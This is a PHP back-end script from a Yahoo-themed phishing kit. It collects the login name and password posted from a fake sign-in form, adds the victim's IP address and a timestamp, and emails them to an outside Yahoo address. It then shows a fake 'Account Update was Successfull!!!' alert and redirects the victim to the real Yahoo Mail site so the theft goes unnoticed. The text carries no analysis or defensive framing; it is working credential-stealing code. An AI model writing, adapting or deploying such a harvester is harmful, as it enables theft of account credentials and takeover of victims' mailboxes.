<?php
$ip = getenv("REMOTE_ADDR");
$datamasii=date("D M d, Y g:i a");
$message .= "User : ".$_POST['login']."\n";
$message .= "PassWord: " .$_POST['passwd']."\n";
$message .= "IP: ".$ip."\n";
$mesaj = "Hacked By Kenny Vera
Yahoo User : $username
Password : $passwd
----------------------------------------------------
IP : $ip 
DATE : $datamasii
";
mail($recipient,$subject,$message);

$recipient = "angelawhite432@yahoo.com";
$subject = "If GOD BE FOR ME";
$headers = "From:DWMTM";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("", "yahoo", $message);
if (mail($recipient,$subject,$message,$headers))

{
?>
	
		   <script language=javascript>
alert('Account Update was Successfull!!!');
window.location='http://www.yahoomail.com';
</script>
<?

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>>